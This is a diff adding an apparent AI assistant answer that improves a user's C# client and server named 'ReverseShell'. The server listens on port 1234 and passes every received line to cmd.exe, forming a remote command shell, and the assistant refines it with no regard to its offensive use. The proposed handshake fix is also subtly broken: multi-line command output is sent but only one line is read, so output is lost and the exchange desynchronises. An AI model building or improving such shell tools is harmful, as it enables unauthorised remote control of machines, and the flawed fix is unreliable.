@@ -1,0 +1,110 @@
+The issue you're facing is likely due to the order in which the server and client are reading and writing data. In your current implementation, the client writes a command and then immediately reads the server's response. However, the server might not have processed the command and sent the output back before the client starts reading.
+
+To address this issue, you can make the communication more synchronized. One way to achieve this is to introduce a confirmation signal from the server to indicate that it has finished processing the command and is ready to send the output. Here's an updated version of your code to illustrate this:
+
+Server Code:
+csharp
+Copy code
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+
+namespace ReverseShellServer
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            TcpListener listener = new TcpListener(IPAddress.Any, 1234);
+            listener.Start();
+            Console.WriteLine("[+] Waiting for a connection...");
+
+            TcpClient client = listener.AcceptTcpClient();
+            Console.WriteLine("[+] Client connected!");
+
+            NetworkStream stream = client.GetStream();
+            StreamReader reader = new StreamReader(stream);
+            StreamWriter writer = new StreamWriter(stream);
+            writer.AutoFlush = true;
+
+            while (true)
+            {
+                string command = reader.ReadLine();
+                if (command == "exit")
+                    break;
+
+                Process process = new Process();
+                ProcessStartInfo startInfo = new ProcessStartInfo();
+                startInfo.FileName = "cmd.exe";
+                startInfo.Arguments = "/c " + command;
+                startInfo.RedirectStandardOutput = true;
+                startInfo.UseShellExecute = false;
+                process.StartInfo = startInfo;
+                process.Start();
+
+                string output = process.StandardOutput.ReadToEnd();
+                process.WaitForExit();
+
+                // Send a confirmation signal before sending the output
+                writer.WriteLine("CMD_EXECUTION_COMPLETE");
+                
+                // Wait for the client to confirm that it has received the signal
+                reader.ReadLine();
+
+                writer.WriteLine(output);
+            }
+
+            client.Close();
+            listener.Stop();
+        }
+    }
+}
+Client Code:
+csharp
+Copy code
+using System;
+using System.IO;
+using System.Net.Sockets;
+
+namespace ReverseShellClient
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            TcpClient client = new TcpClient("localhost", 1234);
+            NetworkStream stream = client.GetStream();
+            StreamReader reader = new StreamReader(stream);
+            StreamWriter writer = new StreamWriter(stream);
+            writer.AutoFlush = true;
+
+            while (true)
+            {
+                Console.Write(">> ");
+                string command = Console.ReadLine();
+                writer.WriteLine(command);
+
+                if (command == "exit")
+                    break;
+
+                // Wait for the confirmation signal from the server
+                string confirmation = reader.ReadLine();
+                if (confirmation == "CMD_EXECUTION_COMPLETE")
+                {
+                    // Send a confirmation signal to the server
+                    writer.WriteLine("CLIENT_CONFIRMATION_RECEIVED");
+
+                    // Read and display the output
+                    string output = reader.ReadLine();
+                    Console.WriteLine(output);
+                }
+            }
+
+            client.Close();
+        }
+    }
+}
+This modification introduces a "CMD_EXECUTION_COMPLETE" signal from the server and a "CLIENT_CONFIRMATION_RECEIVED" signal from the client to ensure that the client waits for the server to finish processing the command before reading the output.
